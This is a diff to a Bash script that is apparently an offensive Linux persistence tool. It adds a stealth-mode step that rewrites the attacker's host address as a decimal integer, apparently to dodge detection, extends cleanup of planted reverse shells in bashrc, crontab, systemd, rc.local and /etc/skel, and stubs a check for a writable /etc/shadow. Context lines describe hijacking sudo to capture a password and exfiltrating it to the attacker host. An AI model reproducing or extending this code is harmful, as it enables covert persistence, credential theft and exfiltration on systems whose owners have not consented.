@@ -139,6 +139,14 @@ limit_checker() {
 
 stealth_modifications() {
 
+    if $(echo $RHOST | grep -qP "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");
+    then
+	local a b c d ip=$RHOST
+	IFS=. read -r a b c d <<< "$ip"
+	export RHOST=$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))
+	unset IFS
+    fi
+
     DISABLEBASHRC=1
     SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
     SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))
@@ -202,7 +210,7 @@ find_writable() {
 }
 
 remove_writable() {
-    
+
     $REMOVALTOOL $TMPCRON 2> /dev/null
     $REMOVALTOOL $TMPCRONWITHPAYLOAD 2> /dev/null
     $REMOVALTOOL $TMPJJSFILE 2> /dev/null
@@ -391,8 +399,8 @@ sudo_hijack_attack() {
 	    echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
 	    echo "[+] Password will be Stored in $SUDOPASSWORDFILE" &&
 	    echo "[+] $SUDOPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
-	else
-	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+		else
+		    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 	fi
 	echo "-----------------------"
     fi
@@ -421,6 +429,14 @@ cleanup() {
     TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
     TMPCLEANCRONTAB=$(echo $WRITABLE_DIR/$(uuidgen))
 
+    if $(echo $RHOST | grep -qP "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");
+    then
+	local a b c d ip=$RHOST
+	IFS=. read -r a b c d <<< "$ip"
+	RHOST_DECIMAL=$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))
+	unset IFS
+    fi
+
     if [ "$DRYRUN" -ne 1 ];
     then
 	echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
@@ -433,8 +449,8 @@ cleanup() {
 	    echo -e "\e[92m[+]\e[0m Crontab Intercept Found: $HOME/.bashrc"
 	else
 	    grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
-	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Crontab Intercept: $HOME/.bashrc"
+		cp $TMPCLEANBASHRC ~/.bashrc &&
+		echo -e "\e[92m[+]\e[0m Removed Crontab Intercept: $HOME/.bashrc"
 	fi
     fi
 
@@ -445,52 +461,52 @@ cleanup() {
 	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Found: $HOME/.bashrc"
 	else
 	    grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
-	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Sudo Hijack Attack: $HOME/.bashrc"
+		cp $TMPCLEANBASHRC ~/.bashrc &&
+		echo -e "\e[92m[+]\e[0m Removed Sudo Hijack Attack: $HOME/.bashrc"
 	fi
     fi
 
-    if $(grep -qi $1 ~/.bashrc);
+    if $(egrep -qi "$1|$RHOST_DECIMAL" ~/.bashrc);
     then
 	if [ "$DRYRUN" -eq 1 ];
 	then
 	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: $HOME/.bashrc"
 	else
-	    grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
-	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $HOME/.bashrc"
-	    $REMOVALTOOL $TMPCLEANBASHRC
+	    egrep -v "$1|$RHOST_DECIMAL" ~/.bashrc > $TMPCLEANBASHRC &&
+		cp $TMPCLEANBASHRC ~/.bashrc &&
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $HOME/.bashrc"
+			    $REMOVALTOOL $TMPCLEANBASHRC
 	fi
     fi
 
     CRONBINARY=$(which crontab)
-    if $($CRONBINARY -l 2> /dev/null | grep -q $1);
+    if $($CRONBINARY -l 2> /dev/null | egrep -qi "$1|$RHOST_DECIMAL");
     then
 	if [ "$DRYRUN" -eq 1 ];
 	then
 	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /var/spool/crontab/$(whoami)"
 	else
-	    $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
+	    $CRONBINARY -l 2> /dev/null | egrep -v "$1|$RHOST_DECIMAL" | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | egrep -v "$1|$RHOST_DECIMAL" 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
 	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /var/spool/crontab/$(whoami)"
 	fi
     fi
 
-    if $(grep -qi $1 /etc/crontab 2> /dev/null);
+    if $(egrep -qi "$1|$RHOST_DECIMAL" /etc/crontab 2> /dev/null);
     then
 	if [ "$DRYRUN" -eq 1 ];
 	then
 	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/crontab"
 	else
-	    grep -v $1 /etc/crontab > $TMPCLEANCRONTAB &&
-	    cp $TMPCLEANCRONTAB /etc/crontab &&
-	    $REMOVALTOOL $TMPCLEANCRONTAB &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/crontab"
+	    egrep -v "$1|$RHOST_DECIMAL" /etc/crontab > $TMPCLEANCRONTAB &&
+		cp $TMPCLEANCRONTAB /etc/crontab &&
+		$REMOVALTOOL $TMPCLEANCRONTAB &&
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/crontab"
 	fi
     fi
 
     for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') /etc/cron.d/ -writable -type f 2> /dev/null);
     do
-	grep -qi $1 $i 2> /dev/null
+	egrep -qi "$1|$RHOST_DECIMAL" $i 2> /dev/null
 	if [[ $? -eq 0 ]];
 	then
 	    if [ "$DRYRUN" -eq 1 ];
@@ -498,14 +514,14 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
 	    else
 		$REMOVALTOOL $i &&
-		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
+		    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
 	    fi
 	fi
     done
 
     for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
     do
-	grep -qi $1 $i 2> /dev/null
+	egrep -qi "$1|$RHOST_DECIMAL" $i 2> /dev/null
 	if [[ $? -eq 0 ]];
 	then
 	    TMP=$(echo $i | sed 's/.*\///g' | tr -d '.' | sed 's/..$//g')
@@ -520,46 +536,46 @@ cleanup() {
 			echo -e "\e[92m[+]\e[0m Reverse Shell Stager Found: $j"
 		    else
 			$REMOVALTOOL $i $j &&
-			echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i" &&
-			echo -e "\e[92m[+]\e[0m Removed Reverse Shell Stager: $j"
+			    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i" &&
+			    echo -e "\e[92m[+]\e[0m Removed Reverse Shell Stager: $j"
 		    fi
 		fi
 	    done
 	fi
     done
 
-    if $(grep -q $1 /etc/rc.local 2> /dev/null);
+    if $(egrep -q "$1|$RHOST_DECIMAL" /etc/rc.local 2> /dev/null);
     then
 	if [ "$DRYRUN" -eq 1 ];
 	then
 	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/rc.local"
 	else
-	    grep -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL &&
-	    cp $TMPCLEANRCLOCAL "/etc/rc.local" &&
-	    if $(cat /etc/rc.local | wc -l | grep -q "^2$");
-	    then
-		$REMOVALTOOL "/etc/rc.local"
-	    fi
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/rc.local"
-	    $REMOVALTOOL $TMPCLEANRCLOCAL
+	    egrep -v "$1|$RHOST_DECIMAL" "/etc/rc.local" > $TMPCLEANRCLOCAL &&
+		cp $TMPCLEANRCLOCAL "/etc/rc.local" &&
+		if $(cat /etc/rc.local | wc -l | grep -q "^2$");
+		then
+		    $REMOVALTOOL "/etc/rc.local"
+		fi
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/rc.local"
+		$REMOVALTOOL $TMPCLEANRCLOCAL
 	fi
     fi
 
-    if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
+    if $(cat /etc/skel/.bashrc 2> /dev/null | egrep -q "$1|$RHOST_DECIMAL");
     then
 	if [ "$DRYRUN" -eq 1 ];
 	then
 	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/skel/.bashrc"
 	else
-	    grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC &&
-	    cp $TMPCLEANBASHRC /etc/skel/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/skel/.bashrc"
+	    egrep -v "$1|$RHOST_DECIMAL" /etc/skel/.bashrc > $TMPCLEANBASHRC &&
+		cp $TMPCLEANBASHRC /etc/skel/.bashrc &&
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/skel/.bashrc"
 	fi
     fi
-    
+
     for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type f 2> /dev/null);
     do
-	grep -qi $1 $i 2> /dev/null
+	egrep -qi "$1|$RHOST_DECIMAL" $i 2> /dev/null
 	if [[ $? -eq 0 ]];
 	then
 	    if [ "$DRYRUN" -eq 1 ];
@@ -567,7 +583,7 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
 	    else
 		$REMOVALTOOL $i &&
-		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
+		    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
 	    fi
 	fi
     done
@@ -578,6 +594,17 @@ enum_defenses() {
 
     echo -e "\e[92m[+]\e[0m Enumerating Tripwire Policies"
     file /etc/tripwire/* | grep "ASCII" | awk -F: '{print $1}' | xargs cat | grep --color=always -e ^SEC -e systemd -e crontab -e bashrc -e rc\.local -e /etc/skel || echo "[+] None Found"
+
+}
+
+add_user() {
+
+    if find /etc/shadow -type f -writable | grep -q shadow;
+    then
+	echo do stuff
+    else
+	echo permission denied
+    fi
 
 }
 
@@ -602,11 +629,11 @@ main() {
 
     sudo_hijack_attack $SUDOPASSWORDFILE
     shadow
-    set_methods
     if [ "$STEALTHMODE" -eq 1 ];
     then
 	stealth_modifications
     fi
+    set_methods
     enum_methods
     webserver_poison_attack
     remove_writable
